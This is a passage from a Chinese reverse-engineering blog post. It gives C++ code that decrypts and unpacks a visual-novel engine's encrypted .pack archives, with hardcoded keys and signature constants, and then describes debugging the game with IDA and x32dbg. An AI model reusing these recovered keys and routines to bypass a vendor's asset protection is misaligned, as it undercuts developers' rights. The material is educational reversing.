i;</span><br><span class="line">    &#125;</span><br><span class="line">    Dencrypt2DataHead* head = (Dencrypt2DataHead*)data;</span><br><span class="line">    <span class="comment">//对比开头是否为0xFF425031</span></span><br><span class="line">    <span class="keyword">if</span> (head-&gt;sign != <span class="number">0xFF435031</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;数据不符合解码条件&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (head-&gt;size&gt; <span class="number">0x20000000</span>u)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;数据量大于0x20000000&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    Dencrypt2DataOutput* Output = <span class="keyword">new</span> <span class="built_in">Dencrypt2DataOutput</span>();</span><br><span class="line">    Output-&gt;len = dencrypted_len;</span><br><span class="line">    Output-&gt;data = <span class="keyword">new</span> BYTE[dencrypted_len + <span class="number">1</span>];</span><br><span class="line">    BYTE* outputbuff = Output-&gt;data;</span><br><span class="line">  </span><br><span class="line">    BYTE* datapos = (BYTE*)data + <span class="built_in">sizeof</span>(Dencrypt2DataHead);</span><br><span class="line">    BYTE* data_start = datapos;</span><br><span class="line">    BYTE* data_end = (BYTE*)data + len;</span><br><span class="line">    BYTE chr;</span><br><span class="line">    <span class="type">int</span> t_pos;</span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">    <span class="keyword">while</span> (data_start &lt; data_end)</span><br><span class="line">    &#123;</span><br><span class="line">        chr = *data_start;</span><br><span class="line">        datapos = data_start + <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">memcpy</span>(table, Sampletable, <span class="number">0x100</span>);</span><br><span class="line">        t_pos = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//建表循环</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (chr &gt; <span class="number">0x7F</span>u)</span><br><span class="line">            &#123;</span><br><span class="line">                t_pos += chr - <span class="number">127</span>;</span><br><span class="line">                chr = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (t_pos &gt; <span class="number">0xFF</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">  </span><br><span class="line">            <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; chr + <span class="number">1</span>; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                table[t_pos] = *datapos++;</span><br><span class="line">                <span class="keyword">if</span> (t_pos != (<span class="type">unsigned</span> __int8)table[t_pos])</span><br><span class="line">                &#123;</span><br><span class="line">                    other[t_pos] = *datapos++;</span><br><span class="line">                &#125;</span><br><span class="line">  </span><br><span class="line">                ++t_pos;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (t_pos &gt; <span class="number">0xFF</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            chr = *datapos++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//数据类型判断</span></span><br><span class="line">        <span class="keyword">if</span> ((head-&gt;isWordType &amp; <span class="number">1</span>) == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            size = *(WORD*)datapos;</span><br><span class="line">            data_start = (datapos + <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            size = *(DWORD*)datapos;</span><br><span class="line">            data_start = (datapos + <span class="number">4</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//解密循环</span></span><br><span class="line">        stack&lt;BYTE&gt; stack;</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            BYTE result;</span><br><span class="line">            <span class="keyword">if</span> (stack.<span class="built_in">size</span>())</span><br><span class="line">            &#123;</span><br><span class="line">                result = stack.<span class="built_in">top</span>();</span><br><span class="line">                stack.<span class="built_in">pop</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (!size)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                size--;</span><br><span class="line">                result = *data_start;</span><br><span class="line">                data_start++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (result == (BYTE)table[result])</span><br><span class="line">            &#123;</span><br><span class="line">                *outputbuff = result;</span><br><span class="line">                outputbuff++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                stack.<span class="built_in">push</span>(other[result]);</span><br><span class="line">                stack.<span class="built_in">push</span>(table[result]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> Output;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DencryptFileName</span><span class="params">(<span class="type">void</span>* data,<span class="type">int</span> character_count,DWORD hash)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> key = ((hash &gt;&gt; <span class="number">0x10</span>) &amp; <span class="number">0xFFFF</span>) ^ hash;</span><br><span class="line">    key = character_count ^ <span class="number">0x3E13</span> ^ key ^ (character_count * character_count);</span><br><span class="line">    DWORD ebx = key;</span><br><span class="line">    DWORD ecx;</span><br><span class="line">    WORD* datapos = (WORD*)data;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; character_count; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ebx = ebx &lt;&lt; <span class="number">3</span>;</span><br><span class="line">        ecx = (ebx + i + key) &amp; <span class="number">0xFFFF</span>;</span><br><span class="line">        ebx = ecx;</span><br><span class="line">        *datapos = (*datapos ^ ebx) &amp; <span class="number">0xFFFF</span>;</span><br><span class="line">        datapos++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">DWORD* <span class="title">dencrypt3_hash</span><span class="params">(<span class="type">int</span> hashlen,<span class="type">int</span> datalen,<span class="type">void</span>* filename,<span class="type">int</span> character_count,DWORD hash)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD key1 = <span class="number">0x85F532</span>; <span class="comment">//ebx</span></span><br><span class="line">    DWORD key2 = <span class="number">0x33F641</span>; <span class="comment">//esi</span></span><br><span class="line">    WORD* character = (WORD*)filename;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; character_count; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        key1 = key1 + (*character &lt;&lt; (i &amp; <span class="number">7</span>));</span><br><span class="line">        key2 ^= key1;</span><br><span class="line">        character++;</span><br><span class="line">    &#125;</span><br><span class="line">    DWORD key3 = (datalen ^ key1 ^ <span class="number">0x8F32DC</span>) + key1 + datalen; <span class="comment">//eax</span></span><br><span class="line">    DWORD key4 = ((datalen &amp; <span class="number">0xFFFFFF</span>) &lt;&lt; <span class="number">3</span>) - datalen; <span class="comment">//edx</span></span><br><span class="line">    key3 += key4;</span><br><span class="line">    key3 ^= hash;</span><br><span class="line">    key3 = ((key3 + key2) &amp; <span class="number">0xFFFFFF</span>) * <span class="number">9</span>;</span><br><span class="line">    <span class="comment">//第二个计算函数</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> rax = key3;</span><br><span class="line">    DWORD* result = <span class="keyword">new</span> DWORD[hashlen];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; hashlen; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        rax = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)(rax ^ <span class="number">0x8DF21431</span>u) * (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)<span class="number">0x8DF21431</span>u;</span><br><span class="line">        rax = ((rax &amp; <span class="number">0xFFFFFFFF00000000</span>) &gt;&gt; <span class="number">32</span>) + (rax &amp; <span class="number">0xFFFFFFFF</span>);</span><br><span class="line">        rax = rax &amp; <span class="number">0xFFFFFFFF</span>;</span><br><span class="line">        result[i] = rax;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dencrypt3</span><span class="params">(<span class="type">void</span>* data,<span class="type">int</span> len, <span class="type">void</span>* filekey)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//0x34相当于4字节数据+0xD</span></span><br><span class="line">    DWORD key1 = (*((DWORD*)filekey + <span class="number">0xD</span>) &amp; <span class="number">0xF</span>) &lt;&lt; <span class="number">3</span>;</span><br><span class="line">    BYTE* datapos = (BYTE*)data, * fkey = (BYTE*)filekey;</span><br><span class="line">    __m64 mm7 = *((__m64*)filekey + <span class="number">0x3</span>); <span class="comment">//这里0x3相当于BYTE的0x18</span></span><br><span class="line">    __m64 mm6, mm0, mm1;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; len &gt;&gt;<span class="number">3</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        mm6 = *(__m64*)(fkey + key1);</span><br><span class="line">        mm7 = _m_pxor(mm7, mm6);</span><br><span class="line">        mm7 = _m_paddd(mm7, mm6);</span><br><span class="line">        mm0 = *(__m64*)datapos;</span><br><span class="line">        mm0 = _m_pxor(mm0, mm7);</span><br><span class="line">        mm1 = mm0;</span><br><span class="line">        *(__m64*)datapos = mm0;</span><br><span class="line">        mm7 = _m_paddb(mm7, mm1);</span><br><span class="line">        mm7 = _m_pxor(mm7, mm1);</span><br><span class="line">        mm7 = _m_pslldi(mm7, <span class="number">0x1</span>);</span><br><span class="line">        mm7 = _m_paddw(mm7, mm1);</span><br><span class="line">        datapos += <span class="number">8</span>;</span><br><span class="line">        key1 = (key1 + <span class="number">8</span>) &amp; <span class="number">0x7F</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    _m_empty();</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BYTE* <span class="title">dencypt4_keyfilehash</span><span class="params">(<span class="type">void</span>* data,<span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span>* keyfilehash = <span class="keyword">new</span> <span class="type">int</span>[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span>* keyfilehash_pos = keyfilehash;</span><br><span class="line">    <span class="comment">//keyhash初始数据的计算</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">3</span> ==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            *keyfilehash_pos = (i + <span class="number">3u</span>) * (i + <span class="number">7u</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            *keyfilehash_pos = -(i + <span class="number">3u</span>) * (i + <span class="number">7u</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        keyfilehash_pos++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> key1 = *(BYTE*)((BYTE*)data + <span class="number">0x31</span>);</span><br><span class="line">    key1 = (key1 % <span class="number">0x49</span>) + <span class="number">0x80</span>;</span><br><span class="line">    <span class="type">int</span> key2 = *(BYTE*)((BYTE*)data + <span class="number">0x1E</span> + <span class="number">0x31</span>);</span><br><span class="line">    key2 = (key2 % <span class="number">7</span>) + <span class="number">7</span>;</span><br><span class="line">    BYTE* keyfilehash_pos_byte = (BYTE*)keyfilehash;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">0x400</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        key1 = (key1 + key2) % len;</span><br><span class="line">        *keyfilehash_pos_byte ^= *(BYTE*)((BYTE*)data + key1);</span><br><span class="line">        keyfilehash_pos_byte++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (BYTE*)keyfilehash;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">DWORD* <span class="title">dencrypt4_hash</span><span class="params">(<span class="type">int</span> hashlen, <span class="type">int</span> datalen, <span class="type">void</span>* filename, <span class="type">int</span> character_count, DWORD hash)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD key1 = <span class="number">0x86F7E2</span>; <span class="comment">//ebx</span></span><br><span class="line">    DWORD key2 = <span class="number">0x4437F1</span>; <span class="comment">//esi</span></span><br><span class="line">    WORD* character = (WORD*)filename;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; character_count; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        key1 = key1 + (*character &lt;&lt; (i &amp; <span class="number">7</span>));</span><br><span class="line">        key2 ^= key1;</span><br><span class="line">        character++;</span><br><span class="line">    &#125;</span><br><span class="line">    DWORD key3 = (datalen ^ key1 ^ <span class="number">0x56E213</span>) + key1 + datalen; <span class="comment">//eax</span></span><br><span class="line">    <span class="type">int</span> key4 = (datalen &amp; <span class="number">0xFFFFFF</span>) * <span class="number">0xD</span>; <span class="comment">//edx</span></span><br><span class="line">    key3 += key4;</span><br><span class="line">    key3 ^= hash;</span><br><span class="line">    key3 = ((key3 + key2) &amp; <span class="number">0xFFFFFF</span>) * <span class="number">0xD</span>;</span><br><span class="line">    <span class="comment">//第二个计算函数</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> rax = key3;</span><br><span class="line">    DWORD* result = <span class="keyword">new</span> DWORD[hashlen];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; hashlen; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        rax = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)(rax ^ <span class="number">0x8A77F473</span>u) * (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)<span class="number">0x8A77F473</span>u;</span><br><span class="line">        rax = ((rax &amp; <span class="number">0xFFFFFFFF00000000</span>) &gt;&gt; <span class="number">32</span>) + (rax &amp; <span class="number">0xFFFFFFFF</span>);</span><br><span class="line">        rax = rax &amp; <span class="number">0xFFFFFFFF</span>;</span><br><span class="line">        result[i] = rax;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dencrypt4</span><span class="params">(<span class="type">void</span>* data, <span class="type">int</span> len, <span class="type">void</span>* filekey,<span class="type">void</span>* keyfilehash)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//0x20相当于4字节数据+0x8</span></span><br><span class="line">    DWORD key1 = (*((DWORD*)filekey + <span class="number">0x8</span>) &amp; <span class="number">0xD</span>) &lt;&lt; <span class="number">3</span>;</span><br><span class="line">    BYTE* datapos = (BYTE*)data, * fkey = (BYTE*)filekey,* keyfilekey = (BYTE*)keyfilehash;</span><br><span class="line">    __m64 mm7 = *((__m64*)filekey + <span class="number">0x3</span>); <span class="comment">//这里0x3相当于BYTE的0x18</span></span><br><span class="line">    __m64 mm6, mm0, mm1,mm5;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; len &gt;&gt; <span class="number">3</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        mm6 = *(__m64*)(fkey + ((key1 &amp; <span class="number">0xF</span>) &lt;&lt; <span class="number">3</span>));</span><br><span class="line">        mm5 = *(__m64*)(keyfilekey + ((key1 &amp; <span class="number">0x7F</span>) &lt;&lt; <span class="number">3</span>));</span><br><span class="line">        mm6 = _m_pxor(mm6, mm5);</span><br><span class="line">        mm7 = _m_pxor(mm7, mm6);</span><br><span class="line">        mm7 = _m_paddd(mm7, mm6);</span><br><span class="line">        mm0 = *(__m64*)datapos;</span><br><span class="line">        mm0 = _m_pxor(mm0, mm7);</span><br><span class="line">        mm1 = mm0;</span><br><span class="line">        *(__m64*)datapos = mm0;</span><br><span class="line">        mm7 = _m_paddb(mm7, mm1);</span><br><span class="line">        mm7 = _m_pxor(mm7, mm1);</span><br><span class="line">        mm7 = _m_pslldi(mm7, <span class="number">0x1</span>);</span><br><span class="line">        mm7 = _m_paddw(mm7, mm1);</span><br><span class="line">        datapos += <span class="number">8</span>;</span><br><span class="line">        key1 = (key1 + <span class="number">1</span>) &amp; <span class="number">0x7F</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    _m_empty();</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">FILE* <span class="title">WideChar_CreateFile</span><span class="params">(<span class="type">const</span> <span class="type">wchar_t</span>* filename)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">wchar_t</span>* pos = (<span class="type">wchar_t</span>*)filename;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        pos = <span class="built_in">wcschr</span>(pos, <span class="string">&#x27;\\&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (pos == <span class="literal">nullptr</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">wchar_t</span>* dir = <span class="keyword">new</span> <span class="type">wchar_t</span>[pos - filename + <span class="number">1</span>]();</span><br><span class="line">        <span class="built_in">wcsncpy</span>(dir, filename, pos - filename);</span><br><span class="line">        _wmkdir(dir);</span><br><span class="line">        pos++;</span><br><span class="line">        <span class="keyword">delete</span> dir;</span><br><span class="line">    &#125;</span><br><span class="line">    FILE* hfile = _wfopen(filename, <span class="string">L&quot;wb&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> hfile;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    string filename;</span><br><span class="line">    cin &gt;&gt; filename;</span><br><span class="line">    FILE* hfile;</span><br><span class="line">    hfile = <span class="built_in">fopen</span>(filename.<span class="built_in">c_str</span>(), <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="comment">//获取文件大小,支持大于4GB文件</span></span><br><span class="line">    _fseeki64(hfile, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="type">fpos_t</span> file_size = _ftelli64(hfile);</span><br><span class="line">    <span class="comment">//读取filepack头</span></span><br><span class="line">    _fseeki64(hfile, file_size - <span class="number">0x1C</span>, <span class="number">0</span>);</span><br><span class="line">    FilePackVer* filepacker = <span class="keyword">new</span> <span class="built_in">FilePackVer</span>();</span><br><span class="line">    <span class="built_in">fread</span>(filepacker, <span class="number">0x1C</span>,<span class="number">1</span> , hfile);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">string</span>(filepacker-&gt;sign) != <span class="string">&quot;FilePackVer3.1\x00\x00&quot;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;FilePackVer签名验证失败&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//读取HashData</span></span><br><span class="line">    HashData *hashdat = <span class="keyword">new</span> <span class="built_in">HashData</span>();</span><br><span class="line">    _fseeki64(hfile,file_size<span class="number">-0x440</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">fread</span>(hashdat,<span class="number">1</span>,<span class="number">0x440</span>,hfile);</span><br><span class="line">    <span class="comment">//数据的设置</span></span><br><span class="line">    <span class="keyword">if</span> (hashdat-&gt;Unkown &gt; <span class="number">8</span> || hashdat-&gt;Unkown &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        hashdat-&gt;Unkown = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    DWORD hash = <span class="built_in">Tohash</span>(&amp;hashdat-&gt;data,<span class="number">0x100</span>) &amp; <span class="number">0x0FFFFFFF</span>;</span><br><span class="line">    <span class="comment">//HashVer里的数据对解包并不重要 直接略过不按照程序一样去读取了</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/////////////////////////////////</span></span><br><span class="line">    <span class="comment">//解码签名</span></span><br><span class="line">    <span class="built_in">dencrypt</span>(&amp;hashdat-&gt;sign, <span class="number">0x20</span>, hash);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strncmp</span>(hashdat-&gt;sign,<span class="string">&quot;8hr48uky,8ugi8ewra4g8d5vbf5hb5s6&quot;</span>,<span class="number">0x20</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;HashData签名验证失败&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//开始解密文件</span></span><br><span class="line">     </span><br><span class="line">    DWORD64 entry = ((<span class="type">long</span> <span class="type">long</span>)filepacker-&gt;entry_high &lt;&lt; <span class="number">32</span>) + (<span class="type">long</span> <span class="type">long</span>)filepacker-&gt;entry_low;</span><br><span class="line">    BYTE* keyfilehash = <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; filepacker-&gt;filecount; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        _fseeki64(hfile, entry, <span class="number">0</span>);</span><br><span class="line">        WORD character_count;</span><br><span class="line">        <span class="built_in">fread</span>(&amp;character_count, <span class="number">2</span>, <span class="number">1</span>, hfile);</span><br><span class="line">        <span class="type">wchar_t</span>* name = <span class="keyword">new</span> <span class="type">wchar_t</span>[character_count + <span class="number">1</span>]();</span><br><span class="line">        <span class="comment">//因为UTF16字节数是ASCII的两倍，所以要乘2</span></span><br><span class="line">        <span class="built_in">fread</span>(name, <span class="number">1</span>, <span class="number">2</span> * character_count, hfile);</span><br><span class="line">        <span class="comment">//解密文件名</span></span><br><span class="line">        <span class="built_in">DencryptFileName</span>(name, character_count, hash);</span><br><span class="line">        FileEntry *fentry = <span class="keyword">new</span> <span class="built_in">FileEntry</span>();</span><br><span class="line">        <span class="built_in">fread</span>(fentry, <span class="number">1</span>, <span class="number">0x1C</span>, hfile);</span><br><span class="line">        entry = _ftelli64(hfile);</span><br><span class="line">        <span class="comment">//文件名hash校检 不重要 略过</span></span><br><span class="line">  </span><br><span class="line">        <span class="comment">//文件读取</span></span><br><span class="line">        <span class="type">char</span>* filedata = <span class="keyword">new</span> <span class="type">char</span>[fentry-&gt;size];</span><br><span class="line">        _fseeki64(hfile, ((<span class="type">long</span> <span class="type">long</span>)fentry-&gt;offset_hight &lt;&lt; <span class="number">32</span>) + (<span class="type">long</span> <span class="type">long</span>)fentry-&gt;offset_low, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">fread</span>(filedata, fentry-&gt;size, <span class="number">1</span>, hfile);</span><br><span class="line">  </span><br><span class="line">        <span class="comment">//解密文件</span></span><br><span class="line">        DWORD* filehash = <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">if</span> (fentry-&gt;EncryptType == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            filehash = <span class="built_in">dencrypt3_hash</span>(<span class="number">0x40</span>, fentry-&gt;size, name, character_count, hash);</span><br><span class="line">            <span class="built_in">dencrypt3</span>(filedata, fentry-&gt;size, filehash);</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">wcsncmp</span>(name, <span class="string">L&quot;pack_keyfile_kfueheish15538fa9or.key&quot;</span>, character_count) == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                keyfilehash = <span class="built_in">dencypt4_keyfilehash</span>(filedata, fentry-&gt;size);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(fentry-&gt;EncryptType == <span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            filehash = <span class="built_in">dencrypt4_hash</span>(<span class="number">0x40</span>, fentry-&gt;size, name, character_count, hash);</span><br><span class="line">            <span class="built_in">dencrypt4</span>(filedata, fentry-&gt;size, filehash, keyfilehash);</span><br><span class="line">        &#125;</span><br><span class="line">        Dencrypt2DataOutput* Output = <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">if</span> (fentry-&gt;isCompressed)</span><br><span class="line">        &#123;</span><br><span class="line">            Output = <span class="built_in">dencrypt2</span>(filedata, fentry-&gt;size, fentry-&gt;dencrypted_size, hash);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            Output = <span class="keyword">new</span> <span class="built_in">Dencrypt2DataOutput</span>();</span><br><span class="line">            Output-&gt;data = (BYTE*)filedata;</span><br><span class="line">            Output-&gt;len = fentry-&gt;dencrypted_size;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//保存文件</span></span><br><span class="line">        wstring filename = <span class="built_in">wstring</span>(name);</span><br><span class="line">        filename = <span class="string">L&quot;Extract\\&quot;</span> + filename;</span><br><span class="line">        FILE* hOut = <span class="built_in">WideChar_CreateFile</span>(filename.<span class="built_in">c_str</span>());</span><br><span class="line">        std::<span class="built_in">fwrite</span>(Output-&gt;data, Output-&gt;len, <span class="number">1</span>, hOut);</span><br><span class="line">        std::<span class="built_in">fclose</span>(hOut);</span><br><span class="line">        <span class="keyword">delete</span> fentry, name, filedata, filehash, Output;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    std::<span class="built_in">fclose</span>(hfile);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="实操复现"><a href="#实操复现" class="headerlink" title="实操复现"></a>实操复现</h1><p>教程是从近月2入手的 跟着一步步分析</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>近月2和万华镜系列的特征一模一样<br>主文件夹下的<code>GameData</code>中的<code>xxx.pack</code>文件就是关键</p><p>32位PE文件<br>用IDA翻string翻出来一些特征<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-45.png" alt="img"><br>其实这里的<code>8hr48uky,8ugi8ewra4g8d5vbf5hb5s6</code>就是验签的hash值<br>交叉引用很容易分析出这里的check<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-46.png" alt="img"></p><p>再通过find_crypt发现sha256 大致能想到引擎从<code>.pack</code>解出数据后作了check检查<br>大致信息就收集这么多</p><h2 id="x32dbg-动态调试"><a href="#x32dbg-动态调试" class="headerlink" title="x32dbg 动态调试"></a>x32dbg 动态调试</h2><p>下面用x32dbg看 方便查看栈和寄存器的值以及对WinAPI下断点<br>发现入口地址与IDA给出的start地址一样</p><p>如果从入口点开始逆向分析的话工作量比较大 学习教程下API断点关注对文件的操作</p><h3 id="设置条件断点"><a href="#设置条件断点" class="headerlink" title="设置条件断点"></a>设置条件断点</h3><h4 id="CreateFileW"><a href="#CreateFileW" class="headerlink" title="CreateFileW"></a>CreateFileW</h4><p>通过API断点 或者搜索字符串定位到<code>74D6E570</code> 条件断点编辑如下<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-47.png" alt="img"></p><p>这里的<code>esp+4</code>的偏移可以很容易通过动调在栈中看到 然后采用utf16格式输出<br>暂停条件设置为0就只会记录日志而不会暂停 可以F9一遍后看日志来分析 再缩小返回</p><p>同理 按教程的输出设置<code>ReadFile</code> <code>SetFilePointer</code> 的条件断点</p><h4 id="ReadFile"><a href="#ReadFile" class="headerlink" title="ReadFile"></a>ReadFile</h4><p>查看官方文档</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">ReadFile</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]                HANDLE       hFile,</span></span><br><span class="line"><span class="params">  [out]               LPVOID       lpBuffer,</span></span><br><span class="line"><span class="params">  [in]                DWORD        nNumberOfBytesToRead,</span></span><br><span class="line"><span class="params">  [out, optional]     LPDWORD      lpNumberOfBytesRead,</span></span><br><span class="line"><span class="params">  [in, out, optional] LPOVERLAPPED 